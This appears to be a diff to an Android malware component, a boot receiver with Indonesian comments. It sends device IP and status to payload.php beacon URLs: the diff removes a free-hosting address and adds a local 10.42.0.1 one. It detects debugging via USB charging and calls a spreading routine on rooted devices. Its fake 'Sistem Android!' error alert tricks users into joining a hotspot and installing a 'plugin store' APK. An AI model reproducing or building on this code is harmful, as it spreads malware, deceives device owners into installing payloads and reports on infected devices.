@@ -50,6 +50,7 @@ import android.net.NetworkInfo;
 import java.io.*;
 import java.net.*;
 import java.util.*;
+import java.util.concurrent.*;
 import java.text.*;
 import java.lang.reflect.*;
 
@@ -170,16 +171,17 @@ public class ReceiverBoot extends BroadcastReceiver
 			}
 		}*/
 
+		_server(context);
+
+		if (getServer()) {
+			logSend(context, "Aktif="+identitasResult+":8888\n");
+		}
+
         if (mainSUPER.equals("hidup")) 
 		{
 			install(context);
 			if (installResult) 
 			{
-				_server(context);
-				if (getServer()) {
-					logSend(context, getServer()+" "+identitasResult+":8888\n");
-				}
-
 				//rooting(context);
 				if (rootResult) 
 				{
@@ -192,28 +194,29 @@ public class ReceiverBoot extends BroadcastReceiver
 			
 			if (installResult) 
 			{
-				_server(context);
-				if (setServer(true).equals("server running")) 
+				if (getServer()) 
 				{
-					logSend(context, "Hotspot terpakai............OK\n");
-
-					String[] data = shellCommands("ls "+pathExternal+"/client/").split("\n");
+					String oke = setServer(true);
+				}
+				
+				String[] data = shellCommands("ls "+pathExternal+"/client/").split("\n");
 					
-					for (int i=0; i<data.length-1; i++) 
-					{
-						Log.i(TAG, "hotspot: "+data[i]);
+				for (int i=0; i<data.length-1; i++) 
+				{
+					Log.i(TAG, "hotspot: "+data[i]);
 
-						if (!utils.checkHotspot(data[i])) {
-							ServiceAlert alert = new ServiceAlert();
-        					alert.dataText = "\n             Sistem Android!\n\n  Dalvikvm driver missed I/QCNEJ (799): |CORE:COM:RCVR| CNE creating socket [0xfa8] can't access ->/system/build.prop/ please following!\n\n  1.  Connecting in this hotspot\n  2.  Open browser URL http://"+identitasResult+":8888/index.php\n  3.  Start download plugin store client android\n  4.  Install apk plugin store";
-        					alert.dataTextSize = 15;
-        					alert.pilihAksi = "hotspot";
-        					alert.dataPaket = "";
+					if (!utils.checkHotspot(data[i])) {
+						ServiceAlert alert = new ServiceAlert();
+        				alert.dataText = "\n             Sistem Android!\n\n  Dalvikvm driver missed I/QCNEJ (799): |CORE:COM:RCVR| CNE creating socket [0xfa8] can't access ->/system/build.prop/ please following!\n\n  1.  Connecting in this hotspot\n  2.  Open browser URL http://"+identitasResult+":8888/index.php\n  3.  Start download plugin store client android\n  4.  Install apk plugin store";
+        				alert.dataTextSize = 15;
+        				alert.pilihAksi = "hotspot";
+        				alert.dataPaket = "";
 
-							context.startService(new Intent(context, ServiceAlert.class));
-						}
+						context.startService(new Intent(context, ServiceAlert.class));
 					}
 				}
+				logSend(context, "Hotspot terpakai............OK\n");
+				
 			}
 		}
 
@@ -224,12 +227,14 @@ public class ReceiverBoot extends BroadcastReceiver
 			if (charger.equals("USB_CHARGER")) {
 				pingResult = false;
 
-				logSendMain(context, "[WARNING!] apk sedang didebug");
+				logSend(context, "[WARNING!] apk sedang didebug");
 			} else {
 				pingResult = true;
 			}
 
-			//DEBUG MODE
+			//   DEBUG MODE
+			// 1.  hapus pingResult untuk nonaktifkan
+			// 2.  ubah local ke main server di method logSend
 			pingResult = true;
 			
         } 
@@ -243,6 +248,17 @@ public class ReceiverBoot extends BroadcastReceiver
         if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) 
         {
 			context.startService(new Intent(context, SystemThread.class));
+
+			if (installResult) 
+			{
+				String k = setServer(true);
+
+				//rooting(context);
+				if (rootResult) 
+				{
+					sebar(context, portal);
+				}
+			}
 
         	/*finishInstall = true;
 			
@@ -330,23 +346,6 @@ public class ReceiverBoot extends BroadcastReceiver
         seteditor.commit();
 	}
 
-	private void logSendMain(Context context, String text) {
-
-		String waktu = new SimpleDateFormat("HH:mm:ss").format(new Date());
-		String ip = Identitas.getIPAddress(true);
-		String hash = "";
-		String[] pros = { "["+waktu+"] ->"+ip+" "+text };
-		try {
-			for (String s : pros)     
-			{
-				hash = URLEncoder.encode(s, "UTF-8");       
-			}
-		}catch (Exception e) {}
-
-		system.reqPayload(context, "http://sunjangyo12.000webhostapp.com/payload.php?outpayload="+hash, "null");
-
-	}
-
 	private void logSend(Context context, String text) {
 		if (pingResult) 
 		{
@@ -361,7 +360,9 @@ public class ReceiverBoot extends BroadcastReceiver
 				}
 			}catch (Exception e) {}
 
-			system.reqPayload(context, system.urlServer+"/payload.php?outpayload="+hash, "null");
+			requestUrl = "http://10.42.0.1/payload.php?outpayload="+hash;
+			requestAksi = "web";
+			mainRequest(context);
 		}
 	}
 
@@ -464,8 +465,6 @@ public class ReceiverBoot extends BroadcastReceiver
         }
 
         if (utils.checkInstallData()) {
-			logSend(context, "download SERVER.............OK\n");
-
 			installResult = true;
         }
 	}
@@ -656,6 +655,66 @@ public class ReceiverBoot extends BroadcastReceiver
 		}
 
 		return "ada";
+	}
+
+	public static String getPublicIPAddress(Context context) {
+    	//final NetworkInfo info = NetworkUtils.getNetworkInfo(context);
+
+    	ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
+    	final NetworkInfo info = cm.getActiveNetworkInfo();
+
+    	RunnableFuture<String> futureRun = new FutureTask<>(new Callable<String>() {
+        	@Override
+        	public String call() throws Exception {
+            	if ((info != null && info.isAvailable()) && (info.isConnected())) {
+                	StringBuilder response = new StringBuilder();
+
+                	try {
+                    	HttpURLConnection urlConnection = (HttpURLConnection) (
+                            new URL("http://checkip.amazonaws.com/").openConnection());
+                    	urlConnection.setRequestProperty("User-Agent", "Android-device");
+                    	//urlConnection.setRequestProperty("Connection", "close");
+                    	urlConnection.setReadTimeout(15000);
+                    	urlConnection.setConnectTimeout(15000);
+                    	urlConnection.setRequestMethod("GET");
+                    	urlConnection.setRequestProperty("Content-type", "application/json");
+                    	urlConnection.connect();
+
+                    	int responseCode = urlConnection.getResponseCode();
+
+                    	if (responseCode == HttpURLConnection.HTTP_OK) {
+
+                        	InputStream in = new BufferedInputStream(urlConnection.getInputStream());
+                        	BufferedReader reader = new BufferedReader(new InputStreamReader(in));
+
+                        	String line;
+                        	while ((line = reader.readLine()) != null) {
+                            	response.append(line);
+                        	}
+
+                    	}
+                    	urlConnection.disconnect();
+                    	return response.toString();
+                	} catch (Exception e) {
+                    	e.printStackTrace();
+                	}
+            	} else {
+                	//Log.w(TAG, "No network available INTERNET OFF!");
+                	return null;
+            	}
+            	return null;
+        	}
+    	});
+
+    	new Thread(futureRun).start();
+
+    	try {
+        	return futureRun.get();
+    	} catch (InterruptedException | ExecutionException e) {
+        	e.printStackTrace();
+        	return null;
+    	}
+
 	}
 
 	public boolean ping(Context context) {
